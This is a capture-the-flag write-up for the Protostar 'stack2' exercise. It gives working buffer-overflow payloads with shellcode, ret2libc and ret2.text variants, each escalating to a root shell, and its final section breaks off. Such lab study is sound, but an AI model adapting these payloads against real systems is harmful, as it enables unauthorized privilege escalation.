# stack2

## solution
Quick disassembly to see the offsets of the variables stored in the binary.
```
[0x080483e0]> pdf @main
            ; DATA XREF from entry0 @ 0x80483f7
┌ 128: int main (int argc, char **argv, char **envp);
│           ; var char *src @ esp+0x4
│           ; var char *dest @ esp+0x18
│           ; var int32_t var_ch @ esp+0x58
│           ; var char *var_8h @ esp+0x5c
```

As the contents of `arg_ch` is copied into the `dest` variable, the size of the offset is the
distance from the start of the `dest` buffer to the `var_ch` variable, which we need to modify.
```
>>> 0x58 - 0x18
64
```

To solve the challenge, we need to change the `var_ch` variable to `0d0a0d0a`.
``
```
user@protostar:/opt/protostar/bin$ GREENIE=$(python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"') ./stack2
you have correctly modified the variable
```

## shells

### classic buffer overflow
First we need to find the offset from the start of the buffer to the %eip register, so we can
redirect process execution. We can do this by giving it a known pattern of bytes, in this case
`BBBBCCCCDDDD`, and so on.
```
(gdb) set env GREENIE AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGG
(gdb) r
Starting program: /opt/protostar/bin/stack2 
Try again, you got 0x42424242

Program received signal SIGSEGV, Segmentation fault.
0x47474747 in ?? ()
```

Since %eip was overwritten with `47474747` the offset is easily calculated as 84 bytes.

```py
import struct

off = 84

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0xbffff68c + 0x80)

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ GREENIE=$(python /tmp/pwn.py) ./stack2
Try again, you got 0x41414141
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2libc
Read stack0 to see how we calculated the appropriate offsets for `libc`, `system` and `/bin/sh`
required for this ret2libc exploit.

```py
import struct

off = 84

pad = 'A' * off

system = struct.pack('I', 0xb7ecffb0)
bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

print pad + system + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ GREENIE=$(python /tmp/pwn.py) ./stack2
Try again, you got 0x41414141
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to shellcode
First we need to find a POP, POP, RET gadget in the target binary. We can do this with
`msfelfscan`.
```
➜  stack git:(master) ✗ msfelfscan -s -f stack2
0x08048587   edi ebp ret
0x08048462   ebx ebp ret
0x080485b7   ebx ebp ret
```

```py
import struct

off = 84

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0x08048587)

ret += 'AAAA'                              # POP
ret += 'AAAA'                              # POP
ret += struct.pack('I', 0xbffff68c + 0x80) # RET

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ GREENIE=$(python /tmp/pwn.py) ./stack2
Try again, you got 0x41414141
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to libc
...
